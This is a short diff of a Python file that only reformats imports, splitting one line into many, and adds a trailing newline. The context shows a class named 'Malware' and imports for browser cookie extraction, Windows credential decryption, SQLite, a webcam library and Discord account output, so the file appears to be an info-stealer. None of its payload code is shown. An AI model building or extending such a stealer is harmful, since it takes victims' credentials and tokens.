@@ -1,4 +1,22 @@
-import shutil, requests, platform, socket, getpass, psutil, browser_cookie3, os, re, sys, subprocess, ctypes, json, base64, sqlite3, zipfile, random, cv2, time
+import shutil
+import requests
+import platform
+import socket
+import getpass
+import psutil
+import browser_cookie3
+import os
+import re
+import sys
+import subprocess
+import ctypes
+import json
+import base64
+import sqlite3
+import zipfile
+import random
+import cv2
+import time
 
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from win32crypt import CryptUnprotectData
@@ -1304,3 +1322,4 @@ Discord Account n°{str(number_discord_account)}:
 if __name__ == "__main__":
     malware = Malware()
     malware.main()
+
